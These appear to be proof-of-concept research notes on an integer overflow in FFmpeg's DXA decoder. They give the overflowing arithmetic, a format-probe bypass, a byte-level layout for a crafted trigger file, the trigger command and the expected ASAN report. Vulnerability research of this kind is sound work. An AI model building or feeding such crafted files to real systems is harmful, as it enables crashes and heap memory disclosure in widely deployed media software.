# PoC Notes: Integer Overflow in DXA decode_init (vuln_001)

## Vulnerability Summary

**File:** `libavcodec/dxa.c`
**Functions:** `decode_init()` (lines 340-341) and `decode_frame()` (lines 275-279)
**Type:** Integer overflow leading to heap buffer over-read (OOB read)

## Root Cause

In `decode_init()`:
```c
c->dsize = avctx->width * avctx->height * 2;       // line 340
c->decomp_buf = av_malloc(c->dsize + DECOMP_BUF_PADDING);  // line 341
```

Both `avctx->width` and `avctx->height` are `int`. The multiplication is performed as signed 32-bit integer arithmetic. With `width=65532` and `height=32772`:

```
65532 * 32772 * 2 = 4,295,229,408
```

This value exceeds INT32_MAX (2,147,483,647) and wraps to **262,112** as a signed int32. Therefore:

- `c->dsize = 262112`
- `av_malloc(262112 + 16)` allocates only ~256 KB for `decomp_buf`

## Exploitation Path

In `decode_frame()` with compression type `compr=4`:

```c
srcptr = c->decomp_buf;                          // 256 KB buffer
for (j = 0; j < avctx->height; j++) {           // 32772 iterations
    memcpy(outptr, srcptr, avctx->width);        // 65532 bytes each
    outptr += stride;
    srcptr += avctx->width;
}
```

- Bytes actually read from `decomp_buf`: 32772 × 65532 = **~2.1 GB**
- Buffer capacity: **~256 KB**
- Result: massive heap out-of-bounds read

The `compr=4` path is critical because it skips the zlib decompression step entirely (lines 246-253), going directly to the rendering loop that reads from `decomp_buf`.

## Format Bypass

The DXA demuxer probe (`dxa_probe`) rejects files with width or height > 2048:
```c
if (... w && w <= 2048 && h && h <= 2048)
    return AVPROBE_SCORE_MAX;
```

This is bypassed by forcing the format with `-f dxa`, which skips format probing.

## Crafted File Structure

| Offset | Field         | Value             | Notes                              |
|--------|---------------|-------------------|------------------------------------|
| 0-3    | Magic         | `DEXA`            | DXA container magic                |
| 4      | Flags         | `0x00`            | No interlace/double-height         |
| 5-6    | Frame count   | `0x0001`          | 1 frame (big-endian)               |
| 7-10   | FPS           | `0x0000000A`      | 10 ms per frame (big-endian)       |
| 11-12  | Width         | `0xFFFC` = 65532  | Triggers overflow with height      |
| 13-14  | Height        | `0x8004` = 32772  | Triggers overflow with width       |
| 15-18  | CMAP tag      | `CMAP`            | Palette chunk                      |
| 19-786 | Palette data  | 768 × `0x00`      | 256 RGB entries (black)            |
| 787-790| FRAM tag      | `FRAM`            | Frame chunk                        |
| 791    | Compression   | `0x04`            | compr=4: raw, skips decompression  |
| 792-795| Compressed sz | `0x00000000`      | No payload needed for compr=4      |

## Trigger Command

```bash
/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg -f dxa -i vuln_001_input.dxa -f null -
```

## Expected ASAN Report

```
==XXXX==ERROR: AddressSanitizer: heap-buffer-overflow on address ...
READ of size 65532 at ...
    #0 ... memcpy ...
    #1 ... decode_frame ...
    #2 ... avcodec_send_packet ...
```
